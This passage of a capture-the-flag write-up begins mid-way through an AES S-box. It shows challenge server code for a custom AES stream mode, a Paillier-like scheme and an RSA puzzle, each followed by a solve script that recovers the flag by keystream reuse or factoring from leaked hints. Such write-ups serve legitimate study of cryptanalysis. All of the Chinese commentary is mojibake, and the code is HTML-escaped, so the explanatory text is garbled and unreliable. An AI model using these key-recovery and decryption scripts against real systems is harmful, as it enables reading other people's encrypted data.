0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) InvSbox = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) xc = lambda a: (((a \u0026lt;\u0026lt; 1) ^ 0x1B) \u0026amp; 0xFF) if (a \u0026amp; 0x80) else (a \u0026lt;\u0026lt; 1) R = ( 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39, ) def t2m(text): text = bytes_to_long(text) matrix = [] for i in range(16): byte = (text \u0026gt;\u0026gt; (8 * (15 - i))) \u0026amp; 0xFF if i % 4 == 0: matrix.append([byte]) else: matrix[i // 4].append(byte) return matrix def m2t(matrix): text = 0 for i in range(4): for j in range(4): text |= (matrix[i][j] \u0026lt;\u0026lt; (120 - 8 * (4 * i + j))) return long_to_bytes(text) class myAES: def __init__(self, MasterKey): self.ChangeKey(MasterKey) def ChangeKey(self, MasterKey): self.RoundKeys = t2m(MasterKey) # print self.RoundKeys for i in range(4, 4 * 11): self.RoundKeys.append([]) if i % 4 == 0: byte = self.RoundKeys[i - 4][0] \\ ^ Sbox[self.RoundKeys[i - 1][1]] \\ ^ R[i // 4] self.RoundKeys[i].append(byte) for j in range(1, 4): byte = self.RoundKeys[i - 4][j] \\ ^ Sbox[self.RoundKeys[i - 1][(j + 1) % 4]] self.RoundKeys[i].append(byte) else: for j in range(4): byte = self.RoundKeys[i - 4][j] \\ ^ self.RoundKeys[i - 1][j] self.RoundKeys[i].append(byte) # print self.RoundKeys def encrypt(self, plaintext): self.plain_state = t2m(plaintext) self.__add_round_key(self.plain_state, self.RoundKeys[:4]) for i in range(1, 10): self.__round_encrypt(self.plain_state, self.RoundKeys[4 * i : 4 * (i + 1)]) self.__sub_bytes(self.plain_state) self.__shift_rows(self.plain_state) self.__sub_bytes(self.plain_state) self.__add_round_key(self.plain_state, self.RoundKeys[40:]) return m2t(self.plain_state) def __add_round_key(self, s, k): for i in range(4): for j in range(4): s[i][j] ^= k[i][j] def __round_encrypt(self, state_matrix, key_matrix): self.__sub_bytes(state_matrix) self.__shift_rows(state_matrix) self.__mix_columns(state_matrix) self.__add_round_key(state_matrix, key_matrix) def __sub_bytes(self, s): for i in range(4): for j in range(4): s[i][j] = Sbox[s[i][j]] def __shift_rows(self, s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3] def __mix_single_column(self, a): # please see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xc(a[0] ^ a[1]) a[1] ^= t ^ xc(a[1] ^ a[2]) a[2] ^= t ^ xc(a[2] ^ a[3]) a[3] ^= t ^ xc(a[3] ^ u) def __mix_columns(self, s): for i in range(4): self.__mix_single_column(s[i]) def xor(a,b): assert len(a) == len(b) tmp = [] for i in range(len(a)): tmp.append(a[i]^b[i]) return bytes(tmp) def exchange_plain(plaintext): new_plain = [] for i in plaintext: new_plain.append(i\u0026lt;\u0026lt;1) new_plain = bytes(new_plain) return new_plain def block_encrypt(plaintext,key,iv): aes = myAES(key) block = len(plaintext)//16 new_plain = exchange_plain(plaintext) cipher = b\u0026#39;\u0026#39; for i in range(block): iv = aes.encrypt(iv) cipher += xor(iv,new_plain[16*i:16*i+16]) return cipher è¿™é“é¢˜ï¼Œç»™å‡ºçš„å—åŠ å¯†ä½¿ç”¨çš„ key å’Œ iv éƒ½æ˜¯åœ¨åˆå§‹åŒ–é˜¶æ®µå†…å®¹ä¸­å°±å·²ç»å›ºå®šäº†çš„ï¼Œåœ¨ä¸€æ¬¡è¿æ¥ä¹‹ä¸­ä¸ä¼šæ›´æ”¹\nè¿ä¸Šå»å¯ä»¥è·å¾—flagçš„å¯†æ–‡ï¼Œé‚£ä¹ˆå¦‚æœæ˜¯CFBæˆ–è€…OFBæ¨¡å¼çš„åŠ å¯†é‚£ä¹ˆè¯¥é¢˜è¿åäº†ä¸€æ¬¡ä¸€å¯†çš„(OTP)åŸåˆ™\nå¯¹äºå¯†é’¥æµå¤ç”¨ï¼Œæˆ‘ä»¬ä¸€ç‚¹ç‚¹è¯•å°±å¯ä»¥äº†\nOFB\nCFB\næ€»çš„æ¥è¯´ï¼Œéƒ½æ˜¯\nçš„å½¢å¼\nsolve # from pwn import * from Crypto.Util.number import * from hashlib import sha256 import string from pwnlib.util.iters import mbruteforce table = string.ascii_letters+string.digits def pow(): io.recvuntil(\u0026#34;XXXX+\u0026#34;) suffix = io.recv(16).decode(\u0026#34;utf8\u0026#34;) io.recvuntil(\u0026#34;== \u0026#34;) cipher = io.recvline().strip().decode(\u0026#34;utf8\u0026#34;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=\u0026#39;fixed\u0026#39;) io.sendlineafter(\u0026#34;XXXX :\u0026#34;, proof) def pad(m): padlen = 16 - len(m) % 16 return m + padlen * bytes([padlen]) def enc(plaintext): print(io.recvuntil(b\u0026#39;[-]\u0026#39;).decode()) io.sendline(b\u0026#34;2\u0026#34;) print(io.recvuntil(b\u0026#39;[-] \u0026#39;).decode()) io.sendline(plaintext) io.recvuntil(b\u0026#34;CipherText:\u0026#34;) c = io.recvuntil(b\u0026#39;[+]\u0026#39;)[:-4] return c def xor(msg1,msg2): assert len(msg1)==len(msg2) return long_to_bytes(bytes_to_long(msg1)^bytes_to_long(msg2)) if __name__ == \u0026#34;__main__\u0026#34;: io = remote(\u0026#34;127.0.0.1\u0026#34;,10004) pow() print(io.recvuntil(b\u0026#39;[-] \u0026#39;).decode()) io.sendline(b\u0026#34;1\u0026#34;) print(io.recvuntil(b\u0026#34;My Encrypted flag is:\u0026#34;).decode()) c = io.recvuntil(b\u0026#39;[+]\u0026#39;)[1:-4] cipherlen = len(c) - 1 fakeplain = cipherlen * b\u0026#39;\\x01\u0026#39; blocksize = cipherlen//16 newcipher = enc(fakeplain) fakeplain = pad(fakeplain) new_plain = [] for i in fakeplain: new_plain.append((i)\u0026lt;\u0026lt;1) new_plain = bytes(new_plain) s = (xor(new_plain,newcipher[:])) fakeplain2 = (xor(s,c)) new_plain = [] for i in fakeplain2: new_plain.append((i)\u0026gt;\u0026gt;1) new_plain = bytes(new_plain) print(new_plain) MyCryptoSystem # é˜¿å·´é˜¿å·´ï¼Œæ‘¸äº†ï¼Œä¸€ä¸­åˆæ—¶é—´æä¸å®šæï¼Œä¸‹åˆè¿˜è¦ä¸Šæœº\nfrom Crypto.Util.number import* import random from secret import flag from hashlib import sha256 import socketserver import signal import string def trans_flag(flag): new_flag = [] for i in range(6): new_flag.append(bytes_to_long(flag[i*7:i*7+7])) return new_flag kbits = 1024 table = string.ascii_letters+string.digits flag = trans_flag(flag) def Setup(kbits): p_bit = kbits//2 q_bit = kbits - p_bit while 1: p = getPrime(p_bit) p_tmp = (p-1)//2 if isPrime(p_tmp): break while 1: q = getPrime(q_bit) q_tmp = (q-1)//2 if isPrime(q_tmp): break N = p*q while 1: g = random.randrange(N*N) if (pow(g,p_tmp * q_tmp,N*N) - 1)%N == 0 and (pow(g,p_tmp * q_tmp,N*N) - 1)//N \u0026gt;= 1 and (pow(g,p_tmp * q_tmp,N*N) - 1)//N \u0026lt;= N - 1: break public = (N,g) return public,p def KeyGen(public): N,g = public a = random.randrange(N*N) h = pow(g,a,N*N) pk = h sk = a return pk,sk def Encrypt(public,pk,m): N,g = public r = random.randrange(N*N) A = pow(g,r,N*N) B = (pow(pk,r,N*N) * (1 + m * N)) % (N * N) return A,B def Add(public,dataCipher1,dataCipher2): N = public[0] A1,B1 = dataCipher1 A2,B2 = dataCipher2 A = (A1*A2)%(N*N) B = (B1*B2)%(N*N) return (A,B) def hint(p): _p = getPrime(2048) _q = getPrime(2048) n = _p*_q e = 0x10001 s = getPrime(300) tmp = (160 * s ** 5 - 4999 * s ** 4 + 3 * s ** 3 +1) phi = (_p-1)*(_q-1) d = inverse(e,phi) k = (_p-s)*d enc = pow(p,e,n) return (tmp,k,enc,n) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;SERVER \u0026lt;INPUT\u0026gt;: \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256(proof).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def handle(self): proof = self.proof_of_work() if not proof: self.request.close() public,p = Setup(kbits) signal.alarm(60) pk = [] for i in range(6): pki,ski = KeyGen(public) pk.append(pki) msg = [123,456,789,123,456,789] CipherPair = [] for i in range(len(pk)): TMP = Encrypt(public,pk[i],msg[i]) CipherPair.append(((TMP),pk[i])) CipherDate = [] for i in range(len(pk)): CipherDate.append(Add(public,Encrypt(public,pk[i],flag[i]),CipherPair[i][0])) self.send(b\u0026#39;What do you want to get?\\n[1]pk_list\\n[2]public_parameters\\n[3]hint_for_p\\n[4]EncRypt_Flag\\n[5]exit\u0026#39;) while 1: option = self.recv() if option == b\u0026#39;1\u0026#39;: self.send(b\u0026#34;[~]My pk_list is:\u0026#34;) self.send(str(pk).encode()) elif option == b\u0026#39;2\u0026#39;: self.send(b\u0026#34;[~]My public_parameters is\u0026#34;) self.send(str(public).encode()) elif option == b\u0026#39;3\u0026#39;: self.send(b\u0026#34;[~]My hint for p is\u0026#34;) self.send(str(hint(p)).encode()) elif option == b\u0026#39;4\u0026#39;: self.send(b\u0026#39;[~]What you want is the flag!\u0026#39;) self.send(str(CipherDate).encode()) else: break self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() Referï¼š\nhttps://link.springer.com/book/10.1007%2Fb94617 æœ‰ç‚¹å…¨åŒæ€çš„æ„æ€ï¼Œæ€è·¯åº”è¯¥éƒ½å·®ä¸å¤šï¼Œè€å¹´äººå®¡ä¸åŠ¨ä»£ç äº†\nsolve # from Crypto.Util.number import * pk = [ 9903345546233406345274390216048265052622725595643911382459514293327907995763783433147838863218937316798528321748709369866569364258411991106643258574989572698239199587284255395798614346448471824851838611865337708256660691836153845389605039594319342717738584309592542607252862142218328138475660803285763968213588394528744053027073152049126506763299065229583353619501424333169829170062395149103651329694449221315641100954836434060049710046515370320763518422757259232374856682888632529561315692561552616649850830047862626833700857587886906774837245010908976175065773850953572418920037258016988361625314499467080329947834, 4657987514327931382586065476207522772971258290989872695879544239943902837884205892985114988879105147508471426477725785278489578603238865417098282642677702682558515261983265111905752045094339807685437631424315910160691213278435428566562930439156460282707569924593158395598671318460018264391187530476992919637306573650359751555942532258246978276100316266002757890715569420913869805217560217134510519346377418614486773028307378572957516734818473041775035754849881665094508458497419054187487268190726118233936603633638471145845999136306136647043157332984411178327008942140608992928610672350874409133847619495978691003983, 7152622146034039999102209659831462740324099991262599130951339134800860469219385611290178799376661722659467449321426175020317292072406471009110088250342445514154276439873731324377138630287652938447079493334481729733399579524933508791782450534231737861241986084043058279901605377263189163625776405289654862504323255599291057684909554237875294477643638400289810490222526085038484864459087125794097728967487662164428457600296095735630725252693027342870722549061819169935860921269104894144054734690002817578317664544134682313233240526480877455943937633095468303194749422586696801627436494347930469704062764072900721232548, 7109779273286288048422281478804269058000170220987326969272411328526909689353334022202761918717633450003773894926300727763953889207715377450335730309751197006520012868095728483075579533219462901668068782447412894870775590238751905671507645068125478347626639590964901574834959983618787306511470121467436989932815779239653115530532446769723177935466135060247074247928491194578344816554353261469294754488631361381078861128074887053925809483235131348049560238616364665057176559180859329509474653282715138146826654691223610824931487517489362866512293278790312452574896436150893275394629547641444721163364866744442609573336, 7013605482466599504215631908713721046317718409278569099893184473489373835086487268247053290346460889649268221380299871646123742986014194382973645546664516341392101622320165115690109134132599946593167293726028899310932600936819760645652261283663993530694302054668286992858073658208217032520244670566118947000884035935625925585375773268470663092328626392488631056760673984746371429897537785286259074077658212766702133795429225879795772702881120673021514373788313589716773325607907621831363437568961397189016495389255827603389591886876630344786847409531508107276526897772978948736479662903818836257353212222762336597842, 4806721251332604936583783100910738385093145269860713974606137000339320309313718310646996553451884286724915427107907524634556622320710583584822842418207893426969244662819580085418538670391877263926570368207843244161385729568080850388644996006667177570562488502257438937466251161234759102309530753153103743200173924429409773543762996308591888655566867525229785743476821619151400424309747726050575041627943897750153111818448811385038416912000573298056564339492261814303206364521764204436008885844987333383021967216866126804296346352232953195581868834806336897980493190883504556027965801104592918053461903544343499793148] pp = ( 116058145608385674276672702733893672956917357809340972538570485852695265863484647565483969096692688010826897645583250179342948573711209724577479990992353280882942137887382013678270315267433526273541196683333653359064888776962783810251136593744944176853011420616507243827538789682910216231628628642669601620197, 1323504804693605855191327443760086345281649229726269111925168787721095025354939523351093646120270955977932471982770625541648435290075746193431150770845139326096348863253122005228642568047448855041631516254485716898369011414099219540232164217042223770732057949218835774974444493789502265425791610604673305652047727570396368311258661773456561780033017199975954989495183950216887552362300470021672023164588797459958072321188375419124464113413271301788579119298216918506641731413551008233009777669881314925772595092716344426679130709454192219868031884699258375512868095144714176573965706489293593500326194562659653969458) hint = ( 3304509274524412540171264358124119088833800976282457766193314963305873033161330887473610701496331727440513718090072303043520886293193462950873554113640228240224124433475441227891344247665419958809785016703063382485354461032693344779418991821542568461754389960108428352247981608899460343162110878318981398514231521555009134803445563830931241367613010673484820004826742929263786069863767135614670210943375086531462135790577385826251711826956133897596282243, 18673552355026493682367993197594041685105912554496204006071318337433750748484198918999006603609070236946794406646857929858271667161159821948643461587573309938436022907905563675893493544137760269437082632764159499720652999895637785568626919233056222688894682434212287149137672927486675552931963662505820165969260332655913416992181107410361559298420835898842186213690962374197086970672645328840383254461784517784780864111625152257285743741377246185357414383169045966336855033328995108673937471012241768717137091699706888762787881023600876751379445077298974464957282953933633278819938276469242913645327826899280730378510831893678633686326067596094217688170054369461965105625780401612104533404625397536763720217428564215968405635508712008844542236283094192295732557282230905545840906632840009978007258478459365608215939033972105748737935689371789627988971740974016203717802975023788606268882962377491740960659808878888064715022917962036921078185337788188828827560750328462479969002281238743276353625438159553170772284740537095985838278172254013674247239470266176189688697125522141751881011405920598024214587381076120444370591846992414608682429746316750727122762979926721420808841162691202812455865023677898835926775902048207423004038897059826740331422462081975344727266724533279470011913633242411494155377901129954948980432938310133971389286531625924644619420043095791394754413875398146297583377962248627741212161303069981941569866944074879499723223751021923981415814664672164190239644127148353124450639473123151046004159881650568067549888897471830276776633029695063826990630398201263925250452965401918712445937288291276956166559477365872979519731483611497593803953363019529897948397338298832801417548743615088306206142876669755008937934689940302481383802561001644113621155496827135409662730409037898943078891337579488375518035794171905834626304322444694, 539377906599424907526632843166406186887994388288395247025677144511569324590324166349932358956945530482435011767601209547968477063774490960749034860906510588252104413420941733125967525475043221168756505292522601577057218771125772685733296338522363178984864495675414130791619818890366370557675326005258390297594292831359088537078656773489065102417473480178237120474398129190736614740095486323803477825764714579797487965970125462158351531803287630303556152941144529035877182222332859272963419562743124506553238333107168737543087680258179370723432262945716883858929178735267308369044505783745182741491958523354179513018857096826520453169699127158441377257448188678204993164831215068755599442400473937072589097943431330269080643575456825957862621837176273757555174664101928305295704140917190943907845610548594061039034810294061809981907459259888820996892671481897701236041260611950043463091395858960542584227353654109383849840291308218862529006542917504664716472128390359084763925098770711610788290622962907016008535400120027033905191127470206070423441540259944787758643369312060605925413027755134600754634776476816867075412026307691016441255799159826836710912465972283668124709418672925573497481469507767821018983331413830308225249670213, 771303616051246597362775631900799039403496855240545309388039239713515343324730245355385505175052264662225716867664932661179695239976689945202466354113882887785256123500397817446363928952385349720106805723398880158118530637817328419529810918253166105130572407675868533684722690701263027695057884781572005203710380389492337464706322197156332747141737567696942141557244601594450697569317561198633787265360908016943129048658517482780709873483395196165037089762085272676446233125576546801464300403172738727818739368290767604363354842370759828029956787539488976004277286939183192793995718557020159731981638723547110532088324527518198313950639459543804840939790334808699633063597436840087738271170775240338399829681169080915374347348793605099404690101311868508864356243014172245954247143538079675646203655046049549064125322505821306915855626027754226417532505315799505040998439588290594143118470042253509832524845224911601112190904726230912309817509408264025187673852524716993402306088622806621715736676790401579697069312650629611634465456687035568440558258548547180371086392877863527742881461641884074483579391836421145981167932451527973965904138695962954324595990655760219255358121458470950021891974378425618763709685740211924807012197107) enc = [( 2370749863764972469554987128423083132152741020419238456792199956271338793369703079791129095737616003377516787283096306824061503011677428843457108641844447745003806414353879288703818779487783955229942181920152588250200669054504452218107095850722768505991162394104886525200011421355381962826397885692150120244491531539377531866284584252422892309748011247515811550244392155248279678705299157537079588584781118082321447337527598026964754363320992168148072800954886229060629354492679636656754286873086972322060862979794720152370297379178231399705112629407022082772459000129648242752712149593022848240307229599933472326639, 10629950550426941565735942536153612126197075426453505801699488530948416427388341145614894540703007927177589576195791501426919155687969896393612899952331105630117997308653329395856690066181874393591881894453952869877799692000865157650370029152823033681542597277374455515630326185288969181207049278972424924124917280845385999799481752211943822401232496627640731964698440335637339531240277243009697942776518858825759945763928468912578631650445582450477310960248021693355312415701840017992455266308763927053090663891585787512051382596977251121622452266044626384323834901483016613229807405392686302206337745279574799725645), ( 8542751637884684025319786450527032227009617479414394231919844939217652338788161470233642473581019170622701720476025009092989013870995959272934965586486840055645006446711683509118553167874426553788648476906001713844361905026951473754320948536863270405442355445689090656080870055731787592798342434870295612231106938988844575221665180789028833163353823895142662603464032381483430210539747595577423739584974097527545540375158029450966706494122549444092584635666880572007044982041658609028110690639268383842637227465891773307663549588908675683344647203385483408274703330184009244117626337442195205480475459017506908378382, 2085464782488608613105478863522869688839446373807422195811803331689394753034371063243583106866586343146531749675569189096780488423721634377236415215284877254947163786418624603900665408073101524722245655198842608618980378770280851746286699343613279939871217219082251933210754404379200901319663736745457626874556188300478654812086483681270689360875895659386846755725802972602048228910282786705793739781283712745503244516889112081931069096299064296710777871729670616642875966694256394184177030901697579198250012643883583860976015695050327069588050903408271139834868592068346344594302367420008530215145642134089913952557), ( 543379651794527156062094782615415987126871620097692229765839746265851208613317355119559668303271787419759988860329095755697435256473567826557245034346459936922682845797773645705160147104133662578144309856704479439289163136941011188877597285072682519886521870892631481613475471998069980876386882958669921110348676779465364405081731380722964576478311374454355160040908216697066270729949487583602342578399647457482050413820300137877454944632271598565235769295077747277719043188373569056439162575396512455806377433545271124528925620470920962892894249748487897779327141712239684724085201311734710383690195147053140764504, 9600165348259661124956404845736396858100519318389925868606888916984643985895386306780982368751778369806274791090833545087200109007614498245855188283074902307949807130479277113285297867794858711826951638363843607817932591111690370962454818512651391989642966123695165335863937606726713692914497273424773388437855020945354376617719527751214041931945111308814001172921038464366498230491013737383072831557104712383544399543012036163649490354003100371174810574006002644174234692655781715586368884960284084967731443156537638580405037295061504085273546300354900099908765784319131236423563368794213970198902823051776517828468), ( 12720343660076569556039596264810303540914689089267418571274368608634502718903963112327879610372603745751539474798195515336467050718375929419345733113911528358484167664963503186841785910027555371478552531495995844268225519704711001985099721356627657840167984002486330570582837406734000720783811150194191002449217705383562675444044945162334756814642251675950438968558499867686939667519299824614533209923956050684477257790445925094911660288187792056096062118083793213147868094394231992192383502108218624286840281922749640371120549106693515481691153295118333950838764473539401082016498358430567956598359917829161043821923, 4650323688588415339019928507804235509220831574748530492223503896814273549337012004014746825250262647080845945994043124954184595880222369378843745537963920765086225346591138786702843017155046291724096922328898328762663213011679875702138741764070774196464897663069143841855764208571026489169132412285776494336297720866132075198429444247196211613036311318314879852868477516679485900845328688901789016225902686170650744766395837690968708316279220636380532088975733777486547226356583429833361452246099636637189734339178241917792021598852161212173979461617456855465936599590284629977902176162000058610035695794065634100639), ( 10396423324897848835409665024677718748748275152542630135546271217978894933756975222671676528440868558146062940715117417453570039212594054647284966702987699660365789971324359154387594924406035801798108650969994651017387528389546784219757728821861009799685768626296589321049051322128571853402725165039936147958562122051637969655142188175452657583158785607562742670990899569674380956330989338377933120635140041105086765896268409172931140656723857868697634702294188534131288843222666037473712998513917783662683841747851217148640555307904431378526795971269753578248986461126093686958140302691940282614769028716224500465400, 10798504168395710787960812876356437285934683803323132830688595372752190494161652829029608445088132125185307268912072641282834290673164295328663953059468256952098951333672231933874502144395072869385220758235319321235155734059642693343763727507971442564909780155636668388696682838764136330992117816596893267196341561066485523081399699619635261170621994915700709742698285689917591029680117943213992352450943218840907244087863115086611479482597679053688944172466634936583338987025301834861645019455669785648445946091342899676952875789185642046350945969242055986671135076879652075682156184614411942863144182851932824842223), ( 6024146563091378683361400585005798994618396955430739256202274414470382614885386935565909835642987305321627688396325616582250978022048902486972239421247523958404794423154859667551329588342537025329667423441363580369169495567970964773693968820126919761419804174567010888728316915168649562127178777376355308064502139123147221947023574172487891669271681846950161748490575086030511122210151190204591379378553678990922119342011478603434071107786918375396663987961758147555293906382425151887060043190720507983485158382548174693081995619844700045348077449835099793967697120736717935383288578127456179213311919161151155174824, 4870502348403192237841744837214583690478227756212766589818598939047582028006298907136620265317438054467335452744116591470143951540556270271380332391795537714716300381577136060628725987549313679113315820130730138650199102902669460738279230412746309056896412027404174717090688033608047192772110096729558448093593198119502746076283713950634532742154889796648667924689635484547336377813437723995975643927939980093528839639771421922806898920769585362627963378567719717948703184928020874906392869582921471386283254630748177578173599118834216729254666298122543633678959357415931927763356558249437476070464496258411089399963)] l = 0 r = 1 \u0026lt;\u0026lt; 300 while True: s = (l + r) // 2 x = (160 * s ** 5 - 4999 * s ** 4 + 3 * s ** 3 + 1) - hint[0] if x \u0026gt; 0: r = s elif x \u0026lt; 0: l = s else: break _p = GCD(pow(2, hint[1] * 65537 + s - 1, hint[3]) - 1, hint[3]) _q = hint[3] // _p d = inverse(65537, (_p - 1) * (_q - 1)) p = pow(hint[2], d, hint[3]) n = pp[0] q = n // p k = (p - 1) * (q - 1) // 4 g = (pow(pp[1], k, n * n) - 1) // n msg = [123, 456, 789, 123, 456, 789] flag = b\u0026#39;\u0026#39; for i in range(6): y = (pow(pk[i], k, n * n) - 1) // n x = y * inverse(g, n) % n m = pow(enc[i][1], k, n * n) * pow(enc[i][0], -k * x, n * n) f = ((m - 1) // n * inverse(k, n) - msg[i]) % n flag += long_to_bytes(f) print(flag) fermat\u0026rsquo;s revenge # å°æ•°å­¦é¢˜\né‡æ–°æ¨¡pï¼Œéœ€è¦å¯¹æŒ‡æ•°å˜å½¢\nå¯¹ä¸Šå¼å’Œnæ±‚gcdå³å¯ã€‚\nfrom Crypto.Util.number import * n = 17329555687339057933030881774167606066714011664369940819755094697939414110116183129515036417930928381309923593306884879686961969722610261114896200690291299753284120079351636102685226435454462581742248968732979816910255384339882675593423385529925794918175056364069416358095759362865710837992174966213332948216626442765218056059227797575954980861175262821459941222980957749720949816909119263643425681517545937122980872133309062049836920463547302193585676588711888598357927574729648088370609421283416559346827315399049239357814820660913395553316721927867556418628117971385375472454118148999848258824753064992040468588511 c = 2834445728359401954509180010018035151637121735110411504246937217024301211768483790406570069340718976013805438660602396212488675995602673107853878297024467687865600759709655334014269938893756460638324659859693599161639448736859952750381592192404889795107146077421499823006298655812398359841137631684363428490100792619658995661630533920917942659455792050032138051272224911869438429703875012535681896010735974555495618216882831524578648074539796556404193333636537331833807459066576022732553707927018332334884641370339471969967359580724737784159811992637384360752274204462169330081579501038904830207691558009918736480389 hint = 2528640120640884291705022551567142949735065756834488816429783990402901687493207894594113717734719036126087363828359113769238235697788243950392064194097056579105620723640796253143555383311882778423540515270957452851097267592400001145658904042191937942341842865936546187498072576943297002184798413336701918670376291021190387536660070933700475110660304652647893127663882847145502396993549034428649569475467365756381857116208029508389607872560487325166953770793357700419069480517845456083758105937644350450559733949764193599564499133714282286339445501435278957250603141596679797055178139335763901195697988437542180256184 p = GCD(hint-pow(1011, n, n), n) q = n//p d = inverse(65537, (p-1)*(q-1)) print(long_to_bytes(pow(c, d, n))) 'flag{1d2f28834ecbd1983b62d30f4723476e}'\nç¬¬äºŒå±Šç¾å›¢ctfé¢„èµ›romeo # æ“ä½œç³»ç»Ÿç»ˆäºè€ƒå®Œäº†ï¼ŒæŠ½ç©ºçœ‹äº†ä¸‹è¿™ä¸ªå®Œå…¨æ²¡æœ‰è¥å…»çš„çº¿ä¸Šèµ›\nfrom Crypto.Util.number import* from Crypto.Cipher import AES from secret import msg,password,flag import socketserver import signal assert len(msg) == 32 assert len(password) == 8 def padding(msg): return msg + bytes([0 for i in range((16 - len(msg))%16)]) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self): return self._recvall() def login(self): right_num = 0 while 1: self.send(b\u0026#39;[~]Please input your password:\u0026#39;) str1 = self.recv().strip()[:8] print(str1) print(password) true_num = 0 for i in range(len(password)): if str1[i] != password[i]: login = False self.send(b\u0026#39;False!\u0026#39;) break else: true_num = i + 1 if right_num \u0026gt; true_num: continue else: right_num = true_num if true_num == len(password): login = True check = b\u0026#39;\u0026#39; for i in range(0x2000): check = self.aes.encrypt(padding(check[:-1] + str1[:i+1])) if login == True: self.send(b\u0026#34;Login Success\u0026#34;) return True,check[:16] return False def handle(self): signal.alarm(100) self.aes = AES.new(padding(password),AES.MODE_ECB) _,final_check = self.login() if _ == 1: 